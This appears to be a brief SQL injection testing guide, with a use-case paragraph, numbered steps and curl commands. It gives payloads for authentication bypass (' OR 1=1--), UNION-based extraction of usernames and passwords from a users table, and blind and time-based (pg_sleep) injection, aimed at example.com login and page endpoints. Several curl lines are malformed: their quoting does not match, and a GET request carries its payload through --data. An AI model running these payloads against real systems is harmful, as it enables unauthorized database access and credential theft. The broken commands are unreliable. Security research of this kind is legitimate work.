## Use case

SQL injection vulnerabilities allow attackers to manipulate database queries, potentially leading to unauthorized data access or modification. Understanding the different types of SQL injection can help security researchers identify and report these vulnerabilities effectively.

## Steps to test

1. Identify a vulnerable input field that interacts with a database query.
2. Test for basic SQL injection by injecting the payload ' OR 1=1-- into the input field.
3. If successful, observe the application's behavior to confirm the vulnerability.
4. For UNION-based extraction, use the payload UNION SELECT username, password FROM users-- to extract credentials.
5. For blind SQL injection, implement conditional responses by injecting payloads like ' AND (SELECT COUNT(*) FROM users) > 0--.
6. For time-based blind SQL injection, use pg_sleep(5) to observe delays in response time.
7. For filter/context bypass, test with XML encoding or array parameters to manipulate the query context.

## Commands

```text
curl -X POST -d 'username=admin&password=' OR 1=1-- 'http://example.com/login'
curl -X POST -d 'username=admin&password=UNION SELECT username, password FROM users-- 'http://example.com/login'
curl -X GET 'http://example.com/page?id=1' --data 'id=1 AND (SELECT COUNT(*) FROM users) > 0--'
curl -X GET 'http://example.com/page?id=1' --data 'id=1; pg_sleep(5)--'
curl -X POST -d 'param=<encoded_payload>' 'http://example.com/endpoint'
```
